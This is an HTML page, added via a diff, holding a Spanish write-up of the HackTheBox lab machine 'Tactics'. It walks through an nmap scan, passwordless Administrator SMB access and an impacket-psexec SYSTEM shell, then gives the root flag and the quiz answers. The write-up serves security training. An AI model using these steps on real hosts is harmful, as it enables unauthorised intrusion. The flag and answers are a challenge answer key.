@@ -1,0 +1,149 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Tactics HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/tactics.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Tactics HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Tactics de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Tactics de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Tactics HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Tactics HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Tactics de la plataforma de HackTheBox","headline":"Writeup Tactics HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Tactics HackTheBox</h1>
+          <p>Resolución de la máquina Tactics de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap, pero nos da un error</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.188.89
+Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 3.27 seconds</span>
+</code></pre></div></div>
+
+<div><p>Nos dice que usemos el parametro -Pn ya que bloquea algunas peticiones</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> -Pn 10.129.188.89
+Nmap scan report for 10.129.188.89
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds</span>
+</code></pre></div></div>
+
+<div><p>En este caso podemos acceder a todos los recursos SMB como Administrator sin contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ smbclient</span><span class="p"> -L 10.129.188.89 -U Administrator
+Password for [WORKGROUP\Administrator]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available</span>
+</code></pre></div></div>
+
+<div><p>Ya que podemos escribir sin contraseña podemos conseguir una shell con psexec de impacket</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-psexec </span><span class="p">WORKGROUP/Administrator@10.129.188.89 -no-pass
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.129.188.89.....
+[*] Found writable share ADMIN$
+[*] Uploading file pxbmoQFg.exe
+[*] Opening SVCManager on 10.129.188.89.....
+[*] Creating service MUAz on 10.129.188.89.....
+[*] Starting service MUAz.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></span><span class="no">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span>
+</code></pre></div></div>
+
+<div><p>Tenemos privilegios máximos asi que podemos ir al escritorio de Administrator y leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\Windows\system32></span><span class="no">cd </span><span class="p">C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop></span><span class="no">dir</span><span class="p">
+ Volume in drive C has no label.
+ Volume Serial Number is EEE0-FCDB
+
+ Directory of C:\Users\Administrator\Desktop
+
+04/21/2021  11:16 PM    &ltDIR>          .
+04/21/2021  11:16 PM    &ltDIR>          ..
+04/23/2021  01:39 AM                32 flag.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   4,645,822,464 bytes free
+
+C:\Users\Administrator\Desktop></span><span class="no">type </span><span class="p">flag.txt
+f751c19eda8f61ce81827e6930a1f40c
+C:\Users\Administrator\Desktop></span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?</strong></li>
+<ul><p></p><li>-Pn</li></ul></blockquote><br>
+
+<blockquote><li><strong>What does the 3-letter acronym SMB stand for?</strong></li>
+<ul><p></p><li>Server Message Block</li></ul></blockquote><br>
+
+<blockquote><li><strong>What port does SMB use to operate at?</strong></li>
+<ul><p></p><li>445</li></ul></blockquote><br>
+
+<blockquote><li><strong>What command line argument do you give to `smbclient` to list available shares?</strong></li>
+<ul><p></p><li>-L</li></ul></blockquote><br>
+
+<blockquote><li><strong>What character at the end of a share name indicates it's an administrative share?</strong></li>
+<ul><p></p><li>$</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which Administrative share is accessible on the box that allows users to view the whole file system?</strong></li>
+<ul><p></p><li>C$</li></ul></blockquote><br>
+
+<blockquote><li><strong>What command can we use to download the files we find on the SMB Share?</strong></li>
+<ul><p></p><li>get</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?</strong></li>
+<ul><p></p><li>psexec.py</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>f751c19eda8f61ce81827e6930a1f40c</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
